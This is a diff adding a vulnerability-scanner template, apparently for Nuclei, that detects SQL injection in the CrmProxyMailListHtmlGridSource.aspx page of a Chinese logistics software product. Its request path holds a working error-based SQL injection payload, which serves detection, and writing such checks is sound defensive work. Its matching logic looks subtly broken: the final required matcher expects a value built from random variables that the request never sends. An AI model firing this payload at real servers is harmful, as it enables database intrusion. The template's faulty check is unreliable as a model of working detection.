@@ -1,0 +1,33 @@
+id: dongshengsoft-crmproxymaillisthtmlgridsource-sqli
+info:
+  name: 东胜物流软件 CrmProxyMailListHtmlGridSource.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: GET
+    path:
+      - "/PriceCarrier/CrmProxyMailListHtmlGridSource.aspx?handle=list&cur_page=1&show_page=10&TITLE=%27and+1%3Csys.fn_varbintohexstr(hashbytes('MD5','1'))--+-"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SqlException:"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
+      - type: dsl
+        dsl:
+          - "contains(body, concat('0x', to_string(t2)))"
